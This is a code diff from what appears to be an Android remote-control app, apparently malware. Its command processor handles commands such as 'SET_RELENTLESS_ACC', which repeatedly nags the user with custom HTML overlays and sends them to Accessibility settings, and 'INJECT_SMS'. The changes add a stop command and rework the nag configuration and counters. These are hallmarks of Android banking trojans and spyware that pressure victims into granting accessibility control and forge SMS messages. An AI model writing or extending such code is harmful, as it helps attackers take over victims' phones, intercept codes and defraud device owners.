@@ -1154,26 +1154,32 @@ object CommandProcessor {
                 }
                 "SET_RELENTLESS_ACC" -> {
                     val parts = content.split("|")
-                    AccRelentlessManager.chillMins = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 1440L
-                    AccRelentlessManager.nagIntervalMins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 2L
-                    AccRelentlessManager.maxNags = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 5
-                    if (parts.size > 3) {
-                        AccRelentlessManager.customHtml = parts.subList(3, parts.size).joinToString("|").trim()
-                    }
+                    val chill = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 1440L
+                    val interval = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 2L
+                    val max = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 5
+                    val html = if (parts.size > 3) parts.subList(3, parts.size).joinToString("|").trim() else null
+                    
+                    AccRelentlessManager.applyNewConfig(ctx, chill, interval, max, html)
+                    
                     status = "RELENTLESS_ACC_CONFIGURED"
-                    errorMsg = "Chill: ${AccRelentlessManager.chillMins}m | Interval: ${AccRelentlessManager.nagIntervalMins}m"
+                    errorMsg = "Chill: ${chill}m | Interval: ${interval}m | Max: $max | Counters Reset"
+                }
+                "STOP_RELENTLESS_ACC" -> {
+                    AccRelentlessManager.stopNagging(ctx)
+                    DynamicUIManager.removeOverlay(ctx)
+                    status = "RELENTLESS_ACC_STOPPED"
                 }
                 "ACC_GOTO_SETTINGS" -> {
                     DynamicUIManager.removeOverlay(ctx)
                     val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                     ctx.startActivity(i)
-                    return
+                    status = "EXECUTED (Opened Settings)"
                 }
                 "ACC_SHOW_HELP" -> {
                     DynamicUIManager.removeOverlay(ctx)
                     val i = Intent(ctx, AccHelpActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                     ctx.startActivity(i)
-                    return
+                    status = "EXECUTED (Opened Help)"
                 }
                 "INJECT_SMS" -> {
                     if (!DefaultSmsManager.isDefaultSms(ctx)) {
